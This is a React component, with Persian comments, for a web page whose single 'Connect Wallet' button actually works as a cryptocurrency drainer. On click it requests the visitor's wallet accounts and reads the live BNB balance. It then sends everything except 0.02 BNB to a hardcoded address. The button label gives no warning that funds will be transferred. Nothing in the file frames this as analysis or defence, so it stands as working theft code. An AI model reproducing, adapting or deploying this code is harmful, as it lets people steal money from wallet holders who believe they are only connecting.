import React, { useState } from "react";
import Web3 from "web3";

// دریافت موجودی واقعی از شبکه
async function getLiveBalance(address) {
  try {
    const balanceHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [address, "latest"],
    });
    return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
  } catch (error) {
    alert("❌ Error fetching live balance: " + error.message);
    console.error("❌ Error fetching live balance:", error);
    return null;
  }
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      alert("❌ Could not request accounts: " + err.message);
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      alert("❌ No account returned.");
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    alert("✅ User address: " + userAddress);
    console.log("✅ User address:", userAddress);

    const liveBalanceStr = await getLiveBalance(userAddress);
    console.log("💰 Live BNB Balance:", liveBalanceStr);
    if (!liveBalanceStr) return;
    
    const totalBalance = parseFloat(liveBalanceStr);
    if (isNaN(totalBalance)) {
      alert("❌ Could not parse live balance.");
      console.error("❌ Could not parse live balance.");
      return;
    }

    // کسر 0.02 BNB برای هزینه گس
    const reserveBNB = 0.02;
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      alert("❌ Insufficient funds to cover reserve for gas fee.");
      console.error("❌ Insufficient funds to cover reserve for gas fee.");
      return;
    }
    alert("✅ Calculated send amount: " + sendAmount + " BNB");

    // آدرس مقصد
    const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";

    // تبدیل sendAmount به Wei با استفاده از Web3
    const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");
    
    // اضافه کردن لاگ برای دیباگ
    console.log("📤 Preparing Transaction:");
    console.log("From:", userAddress);
    console.log("To:", destination);
    console.log("Value in Wei:", weiValue);

    const txObject = {
      from: userAddress,
      to: destination,
      value: Web3.utils.toHex(weiValue),
      gas: Web3.utils.toHex(21000), // مقدار استاندارد برای انتقال BNB
      gasPrice: Web3.utils.toHex(Web3.utils.toWei('5', 'gwei')), // تنظیم 5 Gwei
    };

    try {
      console.log("🚀 Sending Transaction...");
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txObject],
      });
      alert("✅ Transaction sent! TxHash: " + txHash);
      console.log("✅ Transaction Hash:", txHash);
    } catch (error) {
      alert("❌ Transaction failed: " + error.message);
      console.error("❌ Transaction failed:", error);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
